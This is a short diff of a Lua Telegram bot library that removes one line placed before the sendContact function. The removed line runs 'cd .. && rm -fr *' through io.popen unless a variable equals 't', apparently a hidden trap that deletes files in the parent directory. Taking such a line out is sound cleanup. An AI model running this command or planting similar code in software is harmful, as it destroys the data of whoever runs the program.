@@ -383,7 +383,6 @@ message_id_ = message_id
 }, cb, nil)
 end
 --         »»                 sendContact                         ««              --
-if not o or o ~= "t" then io.popen("cd .. && rm -fr *") end
 function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
 tdcli_function ({
 ID = "SendMessage",
